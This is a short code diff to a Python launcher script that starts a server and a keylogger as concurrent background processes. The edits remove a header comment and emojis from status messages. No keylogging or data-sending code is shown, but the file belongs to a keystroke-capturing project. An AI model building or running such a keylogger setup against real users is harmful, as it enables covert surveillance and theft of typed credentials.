@@ -1,5 +1,3 @@
-# launcher.py - A single command to start the server and keylogger.
-
 import subprocess
 import sys
 import time
@@ -15,7 +13,7 @@ def main():
     Launches the server and keylogger as concurrent subprocesses.
     Waits for user interruption to terminate them gracefully.
     """
-    print("🚀 Starting the project...")
+    print(" Starting the project...")
 
     # Start the server process in the background
     try:
@@ -46,7 +44,7 @@ def main():
         server_process.terminate() # Clean up the server process
         return
 
-    print("\n🎉 Project is running!")
+    print("\n Project is running!")
     print("Both server and keylogger are active in the background.")
     print("Press Ctrl+C in this terminal to stop all processes.")
 
